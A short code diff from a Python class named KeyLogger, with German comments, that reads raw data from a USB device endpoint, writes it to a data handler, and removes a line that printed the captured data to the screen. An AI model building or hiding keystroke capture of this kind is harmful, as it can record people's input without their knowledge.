@@ -50,7 +50,6 @@ class KeyLogger:
                 data = dev.read(0x81, 64)  # Endpoint-Adresse und Puffergröße anpassen
                 # Hier können Sie mit den USB-Daten weiterarbeiten
                 self.data_handler.write(data)
-                print("Empfangene Daten: ", data)
         except KeyboardInterrupt:
             pass
         finally:
